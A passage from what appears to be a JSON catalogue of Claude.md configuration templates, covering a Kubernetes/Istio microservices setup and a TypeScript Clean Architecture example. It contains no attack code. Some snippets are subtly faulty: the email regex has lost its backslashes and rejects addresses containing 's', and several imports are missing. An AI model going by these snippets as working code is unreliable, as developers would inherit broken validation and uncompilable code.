=> {\n        console.error('Service call failed:', error.message);\n        throw new Error(`Service unavailable: ${error.message}`);\n      }\n    );\n  }\n\n  async get<T>(path: string): Promise<T> {\n    const response = await this.client.get(path);\n    return response.data;\n  }\n\n  async post<T>(path: string, data: any): Promise<T> {\n    const response = await this.client.post(path, data);\n    return response.data;\n  }\n\n  private generateTraceId(): string {\n    return Math.random().toString(36).substring(2) + Date.now().toString(36);\n  }\n}\n\n// Usage in Order Service\nexport class OrderService {\n  private userClient: ServiceClient;\n  private productClient: ServiceClient;\n\n  constructor() {\n    this.userClient = new ServiceClient('http://user-service:3001', 'order-service');\n    this.productClient = new ServiceClient('http://product-service:3002', 'order-service');\n  }\n\n  async createOrder(orderData: CreateOrderRequest): Promise<Order> {\n    // Validate user exists\n    const user = await this.userClient.get<User>(`/users/${orderData.userId}`);\n    \n    // Validate products exist and get prices\n    const products = await Promise.all(\n      orderData.items.map(item => \n        this.productClient.get<Product>(`/products/${item.productId}`)\n      )\n    );\n\n    // Create order with validated data\n    const order = new Order({\n      userId: user.id,\n      items: orderData.items,\n      totalAmount: this.calculateTotal(products, orderData.items)\n    });\n\n    return await this.orderRepository.save(order);\n  }\n}\n```\n\n## Kubernetes Configuration\n\n### Service Deployment\n```yaml\n# infrastructure/kubernetes/user-service-deployment.yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: user-service\n  labels:\n    app: user-service\n    version: v1\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: user-service\n      version: v1\n  template:\n    metadata:\n      labels:\n        app: user-service\n        version: v1\n    spec:\n      containers:\n      - name: user-service\n        image: user-service:v1.0.0\n        ports:\n        - containerPort: 3001\n        env:\n        - name: DATABASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: user-service-secrets\n              key: database-url\n        - name: SERVICE_MESH_ENABLED\n          value: \"true\"\n        resources:\n          requests:\n            memory: \"256Mi\"\n            cpu: \"250m\"\n          limits:\n            memory: \"512Mi\"\n            cpu: \"500m\"\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 3001\n          initialDelaySeconds: 30\n          periodSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 3001\n          initialDelaySeconds: 5\n          periodSeconds: 5\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: user-service\n  labels:\n    app: user-service\nspec:\n  selector:\n    app: user-service\n  ports:\n  - port: 80\n    targetPort: 3001\n    name: http\n```\n\n## Istio Service Mesh Configuration\n\n### Virtual Service and Destination Rule\n```yaml\n# infrastructure/istio/user-service-virtual-service.yaml\napiVersion: networking.istio.io/v1beta1\nkind: VirtualService\nmetadata:\n  name: user-service\nspec:\n  hosts:\n  - user-service\n  http:\n  - match:\n    - headers:\n        x-version:\n          exact: v2\n    route:\n    - destination:\n        host: user-service\n        subset: v2\n      weight: 100\n  - route:\n    - destination:\n        host: user-service\n        subset: v1\n      weight: 100\n    timeout: 5s\n    retries:\n      attempts: 3\n      perTryTimeout: 2s\n---\napiVersion: networking.istio.io/v1beta1\nkind: DestinationRule\nmetadata:\n  name: user-service\nspec:\n  host: user-service\n  trafficPolicy:\n    circuitBreaker:\n      consecutiveErrors: 3\n      interval: 30s\n      baseEjectionTime: 30s\n      maxEjectionPercent: 50\n    loadBalancer:\n      simple: LEAST_CONN\n  subsets:\n  - name: v1\n    labels:\n      version: v1\n  - name: v2\n    labels:\n      version: v2\n```\n\n### API Gateway Configuration\n```yaml\n# infrastructure/istio/api-gateway.yaml\napiVersion: networking.istio.io/v1beta1\nkind: Gateway\nmetadata:\n  name: api-gateway\nspec:\n  selector:\n    istio: ingressgateway\n  servers:\n  - port:\n      number: 80\n      name: http\n      protocol: HTTP\n    hosts:\n    - api.example.com\n  - port:\n      number: 443\n      name: https\n      protocol: HTTPS\n    tls:\n      mode: SIMPLE\n      credentialName: api-tls-secret\n    hosts:\n    - api.example.com\n---\napiVersion: networking.istio.io/v1beta1\nkind: VirtualService\nmetadata:\n  name: api-routes\nspec:\n  hosts:\n  - api.example.com\n  gateways:\n  - api-gateway\n  http:\n  - match:\n    - uri:\n        prefix: /api/v1/users\n    route:\n    - destination:\n        host: user-service\n  - match:\n    - uri:\n        prefix: /api/v1/products\n    route:\n    - destination:\n        host: product-service\n  - match:\n    - uri:\n        prefix: /api/v1/orders\n    route:\n    - destination:\n        host: order-service\n```\n\n## Event-Driven Communication\n\n### Event Publisher\n```typescript\n// shared/libraries/event-publisher.ts\nimport { EventEmitter } from 'events';\n\ninterface DomainEvent {\n  id: string;\n  type: string;\n  aggregateId: string;\n  aggregateType: string;\n  version: number;\n  timestamp: Date;\n  data: any;\n}\n\nexport class EventPublisher {\n  private eventEmitter: EventEmitter;\n\n  constructor() {\n    this.eventEmitter = new EventEmitter();\n  }\n\n  async publish(event: DomainEvent): Promise<void> {\n    console.log(`Publishing event: ${event.type}`, event);\n    \n    // Publish to message queue (RabbitMQ, Kafka, etc.)\n    await this.publishToMessageQueue(event);\n    \n    // Emit locally for any listeners\n    this.eventEmitter.emit(event.type, event);\n  }\n\n  subscribe(eventType: string, handler: (event: DomainEvent) => Promise<void>): void {\n    this.eventEmitter.on(eventType, handler);\n  }\n\n  private async publishToMessageQueue(event: DomainEvent): Promise<void> {\n    // Implementation depends on your message queue choice\n    // Example with RabbitMQ or Kafka\n  }\n}\n\n// Usage in User Service\nexport class UserService {\n  constructor(\n    private userRepository: UserRepository,\n    private eventPublisher: EventPublisher\n  ) {}\n\n  async createUser(userData: CreateUserRequest): Promise<User> {\n    const user = new User(userData);\n    await this.userRepository.save(user);\n\n    // Publish domain event\n    await this.eventPublisher.publish({\n      id: generateEventId(),\n      type: 'UserCreated',\n      aggregateId: user.id,\n      aggregateType: 'User',\n      version: 1,\n      timestamp: new Date(),\n      data: {\n        userId: user.id,\n        email: user.email,\n        name: user.name\n      }\n    });\n\n    return user;\n  }\n}\n```\n\n## Observability and Monitoring\n\n### Distributed Tracing\n```typescript\n// shared/libraries/tracing.ts\nimport { NodeTracerProvider } from '@opentelemetry/sdk-node';\nimport { Resource } from '@opentelemetry/resources';\nimport { SemanticResourceAttributes } from '@opentelemetry/semantic-conventions';\nimport { JaegerExporter } from '@opentelemetry/exporter-jaeger';\n\nexport function initializeTracing(serviceName: string): void {\n  const provider = new NodeTracerProvider({\n    resource: new Resource({\n      [SemanticResourceAttributes.SERVICE_NAME]: serviceName,\n      [SemanticResourceAttributes.SERVICE_VERSION]: process.env.SERVICE_VERSION || '1.0.0',\n    }),\n  });\n\n  provider.addSpanProcessor(\n    new BatchSpanProcessor(\n      new JaegerExporter({\n        endpoint: process.env.JAEGER_ENDPOINT || 'http://jaeger:14268/api/traces',\n      })\n    )\n  );\n\n  provider.register();\n  console.log(`Tracing initialized for service: ${serviceName}`);\n}\n\n// Usage in service\ninitializeTracing('user-service');\n```\n\n### Health Checks and Metrics\n```typescript\n// shared/libraries/health-check.ts\ninterface HealthCheck {\n  name: string;\n  check: () => Promise<boolean>;\n}\n\nexport class HealthChecker {\n  private checks: HealthCheck[] = [];\n\n  addCheck(check: HealthCheck): void {\n    this.checks.push(check);\n  }\n\n  async checkHealth(): Promise<{ status: string; checks: any[] }> {\n    const results = await Promise.all(\n      this.checks.map(async (check) => {\n        try {\n          const healthy = await check.check();\n          return { name: check.name, status: healthy ? 'UP' : 'DOWN' };\n        } catch (error) {\n          return { name: check.name, status: 'DOWN', error: error.message };\n        }\n      })\n    );\n\n    const allHealthy = results.every(result => result.status === 'UP');\n    \n    return {\n      status: allHealthy ? 'UP' : 'DOWN',\n      checks: results\n    };\n  }\n}\n\n// Usage\nconst healthChecker = new HealthChecker();\nhealthChecker.addCheck({\n  name: 'database',\n  check: async () => await database.isConnected()\n});\nhealthChecker.addCheck({\n  name: 'redis',\n  check: async () => await redis.ping()\n});\n```\n\n## Security Implementation\n\n### Service-to-Service Authentication\n```yaml\n# infrastructure/istio/security-policy.yaml\napiVersion: security.istio.io/v1beta1\nkind: PeerAuthentication\nmetadata:\n  name: default\n  namespace: production\nspec:\n  mtls:\n    mode: STRICT\n---\napiVersion: security.istio.io/v1beta1\nkind: AuthorizationPolicy\nmetadata:\n  name: user-service-policy\nspec:\n  selector:\n    matchLabels:\n      app: user-service\n  rules:\n  - from:\n    - source:\n        principals: [\"cluster.local/ns/production/sa/order-service\"]\n    to:\n    - operation:\n        methods: [\"GET\", \"POST\"]\n        paths: [\"/users/*\"]\n  - from:\n    - source:\n        principals: [\"cluster.local/ns/production/sa/api-gateway\"]\n    to:\n    - operation:\n        methods: [\"GET\", \"POST\", \"PUT\", \"DELETE\"]\n```\n\n## Testing Strategies\n\n### Integration Testing\n```typescript\n// tools/testing/integration-test.ts\nimport { TestEnvironment } from './test-environment';\n\ndescribe('Order Service Integration Tests', () => {\n  let testEnv: TestEnvironment;\n\n  beforeAll(async () => {\n    testEnv = new TestEnvironment();\n    await testEnv.setup();\n  });\n\n  afterAll(async () => {\n    await testEnv.cleanup();\n  });\n\n  test('should create order with valid user and products', async () => {\n    // Arrange\n    const user = await testEnv.createTestUser();\n    const product = await testEnv.createTestProduct();\n\n    // Act\n    const order = await testEnv.orderService.createOrder({\n      userId: user.id,\n      items: [{ productId: product.id, quantity: 2 }]\n    });\n\n    // Assert\n    expect(order.id).toBeDefined();\n    expect(order.userId).toBe(user.id);\n    expect(order.items).toHaveLength(1);\n  });\n\n  test('should handle user service unavailability gracefully', async () => {\n    // Arrange\n    await testEnv.simulateServiceDown('user-service');\n\n    // Act & Assert\n    await expect(\n      testEnv.orderService.createOrder({\n        userId: 'invalid-user',\n        items: [{ productId: 'product-1', quantity: 1 }]\n      })\n    ).rejects.toThrow('Service unavailable');\n  });\n});\n```\n\n## Deployment and Operations\n\n### CI/CD Pipeline\n- Use GitOps workflow with ArgoCD or Flux\n- Implement canary deployments with traffic splitting\n- Automated rollback on health check failures\n- Blue-green deployments for zero-downtime updates\n\n### Monitoring and Alerting\n- Service-level objectives (SLOs) and error budgets\n- Distributed tracing with Jaeger\n- Metrics collection with Prometheus\n- Log aggregation with ELK stack\n- Alert management with PagerDuty/OpsGenie\n\n### Scaling Strategies\n- Horizontal Pod Autoscaler (HPA) based on CPU/memory\n- Vertical Pod Autoscaler (VPA) for right-sizing\n- Custom metrics autoscaling\n- Cluster autoscaling for node management\n\n## Best Practices\n\n### Development\n- Domain-driven design for service boundaries\n- API-first development approach\n- Contract testing between services\n- Shared libraries for common functionality\n- Proper error handling and circuit breakers\n\n### Operations\n- Infrastructure as Code (Terraform/Helm)\n- Centralized logging and monitoring\n- Security scanning in CI/CD pipeline\n- Regular disaster recovery testing\n- Cost optimization and resource management\n\n### Team Organization\n- Service ownership model\n- Cross-functional teams\n- DevOps culture and practices\n- Documentation and knowledge sharing\n- On-call rotation and incident response",
      "tags": [
        {
          "tag": {
            "id": "microservices",
            "name": "microservices",
            "slug": "microservices"
          }
        },
        {
          "tag": {
            "id": "service-mesh",
            "name": "service-mesh",
            "slug": "service-mesh"
          }
        },
        {
          "tag": {
            "id": "api-gateway",
            "name": "api-gateway",
            "slug": "api-gateway"
          }
        },
        {
          "tag": {
            "id": "distributed-systems",
            "name": "distributed-systems",
            "slug": "distributed-systems"
          }
        },
        {
          "tag": {
            "id": "kubernetes",
            "name": "kubernetes",
            "slug": "kubernetes"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 49,
        "copies": 145
      },
      "_count": {
        "votes": 52,
        "copies": 190
      },
      "difficulty": "ADVANCED",
      "language": "Multiple",
      "framework": "Kubernetes + Istio",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "clean-architecture-implementation",
      "title": "Clean Architecture + Hexagonal Architecture",
      "slug": "clean-architecture-hexagonal-implementation",
      "tagline": "Node.js + Domain-Driven Design configuration for advanced developers",
      "description": "Complete Clean Architecture implementation with hexagonal architecture, domain modeling, dependency injection, and proper separation of concerns.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - Clean Architecture + Hexagonal Architecture\n\n## Project Overview\n\nThis is a comprehensive Clean Architecture implementation using hexagonal architecture principles, domain-driven design, and SOLID principles. The project demonstrates proper separation of concerns, dependency inversion, and testable, maintainable code structure.\n\n## Architecture Philosophy\n\n### Clean Architecture Principles\n1. **Independence of Frameworks**: The architecture doesn't depend on frameworks\n2. **Testable**: Business rules can be tested without UI, database, or external elements\n3. **Independent of UI**: The UI can change without changing the rest of the system\n4. **Independent of Database**: Business rules are not bound to the database\n5. **Independent of External Agency**: Business rules don't know about outside world\n\n### Hexagonal Architecture (Ports and Adapters)\n- **Domain Core**: Contains business logic and domain models\n- **Ports**: Define interfaces for interaction with external systems\n- **Adapters**: Implement the ports, providing concrete implementations\n- **Application Services**: Orchestrate domain operations\n\n## Technology Stack\n\n- **Language**: TypeScript\n- **Runtime**: Node.js\n- **Dependency Injection**: inversify or tsyringe\n- **Validation**: class-validator, joi\n- **Testing**: Jest, supertest\n- **Database**: Prisma/TypeORM (as adapter)\n- **Web Framework**: Express (as adapter)\n\n## Project Structure\n\n```\nclean-architecture-app/\n├── src/\n│   ├── domain/              # Domain Layer (Enterprise Business Rules)\n│   │   ├── entities/        # Domain entities\n│   │   ├── value-objects/   # Value objects\n│   │   ├── repositories/    # Repository interfaces (ports)\n│   │   ├── services/        # Domain services\n│   │   └── events/          # Domain events\n│   ├── application/         # Application Layer (Use Cases)\n│   │   ├── use-cases/       # Application use cases\n│   │   ├── ports/           # Application ports (interfaces)\n│   │   ├── services/        # Application services\n│   │   └── dto/             # Data transfer objects\n│   ├── infrastructure/      # Infrastructure Layer (Adapters)\n│   │   ├── database/        # Database adapters\n│   │   ├── external/        # External service adapters\n│   │   ├── messaging/       # Message queue adapters\n│   │   └── config/          # Configuration\n│   ├── presentation/        # Presentation Layer (Controllers)\n│   │   ├── http/            # HTTP controllers\n│   │   ├── graphql/         # GraphQL resolvers\n│   │   ├── cli/             # CLI commands\n│   │   └── middleware/      # Web middleware\n│   └── main/                # Main Layer (Composition Root)\n│       ├── factories/       # Factory pattern implementations\n│       ├── di/              # Dependency injection container\n│       └── server.ts        # Application entry point\n├── tests/\n│   ├── unit/                # Unit tests\n│   ├── integration/         # Integration tests\n│   └── e2e/                 # End-to-end tests\n└── docs/\n    ├── architecture/        # Architecture documentation\n    └── domain/              # Domain documentation\n```\n\n## Domain Layer Implementation\n\n### Domain Entity\n```typescript\n// src/domain/entities/User.ts\nimport { Email } from '../value-objects/Email';\nimport { UserId } from '../value-objects/UserId';\nimport { DomainEvent } from '../events/DomainEvent';\nimport { UserCreatedEvent } from '../events/UserCreatedEvent';\n\nexport class User {\n  private _domainEvents: DomainEvent[] = [];\n\n  constructor(\n    private readonly _id: UserId,\n    private _email: Email,\n    private _name: string,\n    private _isActive: boolean = true,\n    private readonly _createdAt: Date = new Date(),\n    private _updatedAt: Date = new Date()\n  ) {\n    this.validate();\n  }\n\n  static create(email: Email, name: string): User {\n    const userId = UserId.generate();\n    const user = new User(userId, email, name);\n    \n    // Raise domain event\n    user.addDomainEvent(new UserCreatedEvent(userId, email, name));\n    \n    return user;\n  }\n\n  // Getters\n  get id(): UserId { return this._id; }\n  get email(): Email { return this._email; }\n  get name(): string { return this._name; }\n  get isActive(): boolean { return this._isActive; }\n  get createdAt(): Date { return this._createdAt; }\n  get updatedAt(): Date { return this._updatedAt; }\n  get domainEvents(): DomainEvent[] { return [...this._domainEvents]; }\n\n  // Business methods\n  updateEmail(newEmail: Email): void {\n    if (this._email.equals(newEmail)) {\n      return; // No change needed\n    }\n\n    const oldEmail = this._email;\n    this._email = newEmail;\n    this._updatedAt = new Date();\n    \n    this.addDomainEvent(new UserEmailUpdatedEvent(this._id, oldEmail, newEmail));\n  }\n\n  deactivate(): void {\n    if (!this._isActive) {\n      throw new Error('User is already inactive');\n    }\n\n    this._isActive = false;\n    this._updatedAt = new Date();\n    \n    this.addDomainEvent(new UserDeactivatedEvent(this._id));\n  }\n\n  activate(): void {\n    if (this._isActive) {\n      throw new Error('User is already active');\n    }\n\n    this._isActive = true;\n    this._updatedAt = new Date();\n    \n    this.addDomainEvent(new UserActivatedEvent(this._id));\n  }\n\n  clearDomainEvents(): void {\n    this._domainEvents = [];\n  }\n\n  private addDomainEvent(event: DomainEvent): void {\n    this._domainEvents.push(event);\n  }\n\n  private validate(): void {\n    if (!this._name || this._name.trim().length === 0) {\n      throw new Error('User name cannot be empty');\n    }\n\n    if (this._name.length > 100) {\n      throw new Error('User name cannot exceed 100 characters');\n    }\n  }\n\n  // For persistence mapping\n  toPersistence(): any {\n    return {\n      id: this._id.value,\n      email: this._email.value,\n      name: this._name,\n      isActive: this._isActive,\n      createdAt: this._createdAt,\n      updatedAt: this._updatedAt\n    };\n  }\n\n  static fromPersistence(data: any): User {\n    return new User(\n      new UserId(data.id),\n      new Email(data.email),\n      data.name,\n      data.isActive,\n      data.createdAt,\n      data.updatedAt\n    );\n  }\n}\n```\n\n### Value Objects\n```typescript\n// src/domain/value-objects/Email.ts\nexport class Email {\n  private static readonly EMAIL_REGEX = /^[^s@]+@[^s@]+.[^s@]+$/;\n\n  constructor(private readonly _value: string) {\n    this.validate();\n  }\n\n  get value(): string {\n    return this._value;\n  }\n\n  equals(other: Email): boolean {\n    return this._value === other._value;\n  }\n\n  private validate(): void {\n    if (!this._value) {\n      throw new Error('Email cannot be empty');\n    }\n\n    if (!Email.EMAIL_REGEX.test(this._value)) {\n      throw new Error('Invalid email format');\n    }\n\n    if (this._value.length > 255) {\n      throw new Error('Email cannot exceed 255 characters');\n    }\n  }\n}\n\n// src/domain/value-objects/UserId.ts\nimport { v4 as uuidv4 } from 'uuid';\n\nexport class UserId {\n  constructor(private readonly _value: string) {\n    this.validate();\n  }\n\n  static generate(): UserId {\n    return new UserId(uuidv4());\n  }\n\n  get value(): string {\n    return this._value;\n  }\n\n  equals(other: UserId): boolean {\n    return this._value === other._value;\n  }\n\n  private validate(): void {\n    if (!this._value) {\n      throw new Error('UserId cannot be empty');\n    }\n\n    // UUID validation\n    const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;\n    if (!uuidRegex.test(this._value)) {\n      throw new Error('UserId must be a valid UUID');\n    }\n  }\n}\n```\n\n### Domain Repository Interface (Port)\n```typescript\n// src/domain/repositories/UserRepository.ts\nimport { User } from '../entities/User';\nimport { UserId } from '../value-objects/UserId';\nimport { Email } from '../value-objects/Email';\n\nexport interface UserRepository {\n  save(user: User): Promise<void>;\n  findById(id: UserId): Promise<User | null>;\n  findByEmail(email: Email): Promise<User | null>;\n  findAll(offset?: number, limit?: number): Promise<User[]>;\n  delete(id: UserId): Promise<void>;\n  exists(id: UserId): Promise<boolean>;\n}\n```\n\n### Domain Service\n```typescript\n// src/domain/services/UserDomainService.ts\nimport { User } from '../entities/User';\nimport { Email } from '../value-objects/Email';\nimport { UserRepository } from '../repositories/UserRepository';\n\nexport class UserDomainService {\n  constructor(private readonly userRepository: UserRepository) {}\n\n  async isEmailUnique(email: Email, excludeUserId?: UserId): Promise<boolean> {\n    const existingUser = await this.userRepository.findByEmail(email);\n    \n    if (!existingUser) {\n      return true;\n    }\n\n    if (excludeUserId && existingUser.id.equals(excludeUserId)) {\n      return true;\n    }\n\n    return false;\n  }\n\n  async canUserBeDeleted(userId: UserId): Promise<{ canDelete: boolean; reason?: string }> {\n    const user = await this.userRepository.findById(userId);\n    \n    if (!user) {\n      return { canDelete: false, reason: 'User not found' };\n    }\n\n    // Business rule: Only inactive users can be deleted\n    if (user.isActive) {\n      return { canDelete: false, reason: 'Active users cannot be deleted' };\n    }\n\n    // Add more business rules as needed\n    // e.g., check if user has pending orders, etc.\n\n    return { canDelete: true };\n  }\n}\n```\n\n## Application Layer Implementation\n\n### Use Case\n```typescript\n// src/application/use-cases/CreateUser.ts\nimport { User } from '../../domain/entities/User';\nimport { Email } from '../../domain/value-objects/Email';\nimport { UserRepository } from '../../domain/repositories/UserRepository';\nimport { UserDomainService } from '../../domain/services/UserDomainService';\nimport { EventPublisher } from '../ports/EventPublisher';\nimport { CreateUserDto } from '../dto/CreateUserDto';\nimport { UserDto } from '../dto/UserDto';\n\nexport class CreateUserUseCase {\n  constructor(\n    private readonly userRepository: UserRepository,\n    private readonly userDomainService: UserDomainService,\n    private readonly eventPublisher: EventPublisher\n  ) {}\n\n  async execute(dto: CreateUserDto): Promise<UserDto> {\n    // Validate input\n    const email = new Email(dto.email);\n\n    // Check business rules\n    const isEmailUnique = await this.userDomainService.isEmailUnique(email);\n    if (!isEmailUnique) {\n      throw new Error('Email already exists');\n    }\n\n    // Create domain entity\n    const user = User.create(email, dto.name);\n\n    // Persist\n    await this.userRepository.save(user);\n\n    // Publish domain events\n    const domainEvents = user.domainEvents;\n    user.clearDomainEvents();\n\n    for (const event of domainEvents) {\n      await this.eventPublisher.publish(event);\n    }\n\n    // Return DTO\n    return UserDto.fromDomain(user);\n  }\n}\n```\n\n### Data Transfer Objects\n```typescript\n// src/application/dto/UserDto.ts\nimport { User } from '../../domain/entities/User';\n\nexport class UserDto {\n  constructor(\n    public readonly id: string,\n    public readonly email: string,\n    public readonly name: string,\n    public readonly isActive: boolean,\n    public readonly createdAt: Date,\n    public readonly updatedAt: Date\n  ) {}\n\n  static fromDomain(user: User): UserDto {\n    return new UserDto(\n      user.id.value,\n      user.email.value,\n      user.name,\n      user.isActive,\n      user.createdAt,\n      user.updatedAt\n    );\n  }\n}\n\n// src/application/dto/CreateUserDto.ts\nexport class CreateUserDto {\n  constructor(\n    public readonly email: string,\n    public readonly name: string\n  ) {}\n}\n\n// src/application/dto/UpdateUserDto.ts\nexport class UpdateUserDto {\n  constructor(\n    public readonly email?: string,\n    public readonly name?: string\n  ) {}\n}\n```\n\n### Application Ports\n```typescript\n// src/application/ports/EventPublisher.ts\nimport { DomainEvent } from '../../domain/events/DomainEvent';\n\nexport interface EventPublisher {\n  publish(event: DomainEvent): Promise<void>;\n}\n\n// src/application/ports/Logger.ts\nexport interface Logger {\n  info(message: string, context?: any): void;\n  error(message: string, error?: Error, context?: any): void;\n  warn(message: string, context?: any): void;\n  debug(message: string, context?: any): void;\n}\n\n// src/application/ports/EmailService.ts\nexport interface EmailService {\n  sendWelcomeEmail(to: string, name: string): Promise<void>;\n  sendPasswordResetEmail(to: string, resetToken: string): Promise<void>;\n}\n```\n\n## Infrastructure Layer Implementation\n\n### Database Adapter\n```typescript\n// src/infrastructure/database/UserRepositoryImpl.ts\nimport { UserRepository } from '../../domain/repositories/UserRepository';\nimport { User } from '../../domain/entities/User';\nimport { UserId } from '../../domain/value-objects/UserId';\nimport { Email } from '../../domain/value-objects/Email';\nimport { PrismaClient } from '@prisma/client';\n\nexport class UserRepositoryImpl implements UserRepository {\n  constructor(private readonly prisma: PrismaClient) {}\n\n  async save(user: User): Promise<void> {\n    const userData = user.toPersistence();\n    \n    await this.prisma.user.upsert({\n      where: { id: userData.id },\n      update: {\n        email: userData.email,\n        name: userData.name,\n        isActive: userData.isActive,\n        updatedAt: userData.updatedAt\n      },\n      create: userData\n    });\n  }\n\n  async findById(id: UserId): Promise<User | null> {\n    const userData = await this.prisma.user.findUnique({\n      where: { id: id.value }\n    });\n\n    return userData ? User.fromPersistence(userData) : null;\n  }\n\n  async findByEmail(email: Email): Promise<User | null> {\n    const userData = await this.prisma.user.findUnique({\n      where: { email: email.value }\n    });\n\n    return userData ? User.fromPersistence(userData) : null;\n  }\n\n  async findAll(offset = 0, limit = 50): Promise<User[]> {\n    const usersData = await this.prisma.user.findMany({\n      skip: offset,\n      take: limit,\n      orderBy: { createdAt: 'desc' }\n    });\n\n    return usersData.map(userData => User.fromPersistence(userData));\n  }\n\n  async delete(id: UserId): Promise<void> {\n    await this.prisma.user.delete({\n      where: { id: id.value }\n    });\n  }\n\n  async exists(id: UserId): Promise<boolean> {\n    const count = await this.prisma.user.count({\n      where: { id: id.value }\n    });\n\n    return count > 0;\n  }\n}\n```\n\n### External Service Adapters\n```typescript\n// src/infrastructure/external/EmailServiceImpl.ts\nimport { EmailService } from '../../application/ports/EmailService';\nimport { Logger } from '../../application/ports/Logger';\n\nexport class EmailServiceImpl implements EmailService {\n  constructor(\n    private readonly logger: Logger,\n    private readonly smtpConfig: {\n      host: string;\n      port: number;\n      secure: boolean;\n      auth: {\n        user: string;\n        pass: string;\n      };\n    }\n  ) {}\n\n  async sendWelcomeEmail(to: string, name: string): Promise<void> {\n    try {\n      // Implementation using nodemailer or similar\n      this.logger.info('Sending welcome email', { to, name });\n      \n      // Actual email sending logic here\n      \n      this.logger.info('Welcome email sent successfully', { to });\n    } catch (error) {\n      this.logger.error('Failed to send welcome email', error, { to, name });\n      throw error;\n    }\n  }\n\n  async sendPasswordResetEmail(to: string, resetToken: string): Promise<void> {\n    try {\n      this.logger.info('Sending password reset email', { to });\n      \n      // Actual email sending logic here\n      \n      this.logger.info('Password reset email sent successfully', { to });\n    } catch (error) {\n      this.logger.error('Failed to send password reset email', error, { to });\n      throw error;\n    }\n  }\n}\n```\n\n## Presentation Layer Implementation\n\n### HTTP Controller\n```typescript\n// src/presentation/http/UserController.ts\nimport { Request, Response, NextFunction } from 'express';\nimport { CreateUserUseCase } from '../../application/use-cases/CreateUser';\nimport { GetUserUseCase } from '../../application/use-cases/GetUser';\nimport { UpdateUserUseCase } from '../../application/use-cases/UpdateUser';\nimport { CreateUserDto } from '../../application/dto/CreateUserDto';\nimport { UpdateUserDto } from '../../application/dto/UpdateUserDto';\nimport { UserId } from '../../domain/value-objects/UserId';\nimport { validateOrReject } from 'class-validator';\n\nexport class UserController {\n  constructor(\n    private readonly createUserUseCase: CreateUserUseCase,\n    private readonly getUserUseCase: GetUserUseCase,\n    private readonly updateUserUseCase: UpdateUserUseCase\n  ) {}\n\n  async createUser(req: Request, res: Response, next: NextFunction): Promise<void> {\n    try {\n      const createUserDto = new CreateUserDto(req.body.email, req.body.name);\n      \n      // Validate DTO\n      await validateOrReject(createUserDto);\n\n      const userDto = await this.createUserUseCase.execute(createUserDto);\n      \n      res.status(201).json({\n        success: true,\n        data: userDto\n      });\n    } catch (error) {\n      next(error);\n    }\n  }\n\n  async getUser(req: Request, res: Response, next: NextFunction): Promise<void> {\n    try {\n      const userId = new UserId(req.params.id);\n      const userDto = await this.getUserUseCase.execute(userId);\n      \n      if (!userDto) {\n        res.status(404).json({\n          success: false,\n          message: 'User not found'\n        });\n        return;\n      }\n\n      res.json({\n        success: true,\n        data: userDto\n      });\n    } catch (error) {\n      next(error);\n    }\n  }\n\n  async updateUser(req: Request, res: Response, next: NextFunction): Promise<void> {\n    try {\n      const userId = new UserId(req.params.id);\n      const updateUserDto = new UpdateUserDto(req.body.email, req.body.name);\n      \n      const userDto = await this.updateUserUseCase.execute(userId, updateUserDto);\n      \n      res.json({\n        success: true,\n        data: userDto\n      });\n    } catch (error) {\n      next(error);\n    }\n  }\n}\n```\n\n## Dependency Injection Setup\n\n### DI Container Configuration\n```typescript\n// src/main/di/Container.ts\nimport { Container } from 'inversify';\nimport { PrismaClient } from '@prisma/client';\n\n// Domain\nimport { UserDomainService } from '../../domain/services/UserDomainService';\n\n// Application\nimport { CreateUserUseCase } from '../../application/use-cases/CreateUser';\nimport { GetUserUseCase } from '../../application/use-cases/GetUser';\nimport { UpdateUserUseCase } from '../../application/use-cases/UpdateUser';\n\n// Infrastructure\nimport { UserRepositoryImpl } from '../../infrastructure/database/UserRepositoryImpl';\nimport { EmailServiceImpl } from '../../infrastructure/external/EmailServiceImpl';\nimport { ConsoleLoggerImpl } from '../../infrastructure/logging/ConsoleLoggerImpl';\nimport { EventPublisherImpl } from '../../infrastructure/messaging/EventPublisherImpl';\n\n// Presentation\nimport { UserController } from '../../presentation/http/UserController';\n\n// Interfaces\nimport { UserRepository } from '../../domain/repositories/UserRepository';\nimport { EmailService } from '../../application/ports/EmailService';\nimport { Logger } from '../../application/ports/Logger';\nimport { EventPublisher } from '../../application/ports/EventPublisher';\n\nexport const container = new Container();\n\n// Infrastructure dependencies\ncontainer.bind<PrismaClient>(PrismaClient).toConstantValue(new PrismaClient());\ncontainer.bind<Logger>('Logger').to(ConsoleLoggerImpl).inSingletonScope();\n\n// Repository implementations\ncontainer.bind<UserRepository>('UserRepository').to(UserRepositoryImpl);\n\n// External service implementations\ncontainer.bind<EmailService>('EmailService').to(EmailServiceImpl);\ncontainer.bind<EventPublisher>('EventPublisher').to(EventPublisherImpl);\n\n// Domain services\ncontainer.bind<UserDomainService>(UserDomainService).toSelf();\n\n// Use cases\ncontainer.bind<CreateUserUseCase>(CreateUserUseCase).toSelf();\ncontainer.bind<GetUserUseCase>(GetUserUseCase).toSelf();\ncontainer.bind<UpdateUserUseCase>(UpdateUserUseCase).toSelf();\n\n// Controllers\ncontainer.bind<UserController>(UserController).toSelf();\n```\n\n### Application Bootstrap\n```typescript\n// src/main/server.ts\nimport 'reflect-metadata';\nimport express from 'express';\nimport { container } from './di/Container';\nimport { UserController } from '../presentation/http/UserController';\nimport { errorHandler } from '../presentation/middleware/ErrorHandler';\n\nconst app = express();\napp.use(express.json());\n\n// Controllers\nconst userController = container.get<UserController>(UserController);\n\n// Routes\napp.post('/users', userController.createUser.bind(userController));\napp.get('/users/:id', userController.getUser.bind(userController));\napp.put('/users/:id', 